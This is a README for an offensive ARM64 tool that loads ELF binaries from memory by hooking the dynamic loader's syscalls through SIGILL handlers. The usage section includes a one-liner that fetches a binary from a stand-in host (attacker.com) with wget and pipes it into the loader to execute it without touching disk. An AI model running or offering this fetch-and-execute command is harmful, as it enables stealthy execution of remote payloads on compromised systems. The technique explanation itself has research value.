# memdlopen

This is an implementation of the technique developed in the paper [Remote Library Injection](http://web.archive.org/web/20060218185544/http://www.nologin.org/Downloads/Papers/remote-library-injection.pdf) published at Nologin. There's [another implementation](https://github.com/m1m1x/memdlopen) which has a severe problem: **code signatures**, which is precisely what I have fixed.

I think of this project as an alternative to [DDexec](https://github.com/arget13/DDexec).

## Usage
**Currently only available for ARM64, and still trying to get it to work on Android.** Will be ported to x64, until then for x64 (and ARM64 too) you have [DDexec](https://github.com/arget13/DDexec).

Pipe the binary into the memdlopen.sh script, its arguments will be the arguments for the *memdlopened* program (starting with `argv[0]`).
Here, try this
```
bash memdlopen.sh ls -lA < /bin/ls
```
which is easily weaponizable with something like
```
wget -O- https://attacker.com/binary.elf | bash memdlopen.sh argv0 foo bar
```
or you can paste the base64 of the binary to this command
```
base64 -d | bash memdlopen.sh argv0 foo bar
```

## In a li'l more detail
The way this tool achieves execution of the shellcode is the same as DDexec and is explained [here](https://github.com/arget13/DDexec#the-technique) -in fact memdlopen.sh is a modified version of ddsc.sh from the DDexec repository. The shellcode is what differs. While the DDexec shellcode parses the binary and the loader and loads them both, leaving then the loader to load the binary's dependencies, the memdlopen shellcode calls `dlopen()` and tricks the loader into loading the file from memory instead of disk.

The idea presented in the forementioned paper [Remote Library Injection](http://web.archive.org/web/20060218185544/http://www.nologin.org/Downloads/Papers/remote-library-injection.pdf) is to hook in some way to the syscalls the loader performs while loading a shared object, then **spoof these syscalls and pretend** they were performed by the kernel when they are intended to obtain data from the fake filepath we give to `dlopen()`. So when the loader tries to `open()` (or `openat()`) our file we will see our fake filename in the argument for `open()` and will return a fake file descriptor (e. g. 1337). In subsequent file operations the loader will use this file descriptor when trying to `read()` or `mmap()` from the file. We will detect the use of said fd and just `memcpy()` from the memory area where the file is laid to the address the loader wants the data.

### Code signatures is a bad idea
OK, so we need to find a way to hook to these syscalls the loader makes but in the paper its authors never specify how to make this. There is an implementation of the technique [here](https://github.com/m1m1x/memdlopen) which uses **code signatures** to find the places where the loader makes each syscall. This is a severe problem that renders the implementation unhelpful: you would need to download the loader from the system, search the code signatures for that specific build and reassemble the payload. Forget about it.

### Hooking syscalls my way
My idea is to search the loader for `svc #0`/`syscall` instructions and replace them with invalid ones. After installing a signal handler for the SIGILL signal we will be in effect hooked to all syscalls the loader performs. When the loader executes this invalid instruction the process will receive a SIGILL instruction and our signal handler will be called. When a signal handler is called all the context previous to the signal is saved in the stack ([struct sigcontext](https://elixir.bootlin.com/linux/latest/source/arch/arm64/include/uapi/asm/sigcontext.h#L28), which is different in [x64](https://elixir.bootlin.com/linux/latest/source/arch/x86/include/uapi/asm/sigcontext.h#L238)). From this structure we can obtain all the arguments and the syscall number intended for the kernel. Now we can let the syscall through to the kernel or fake it if needed, then return seamlessly and the loader won't suspect a thing.
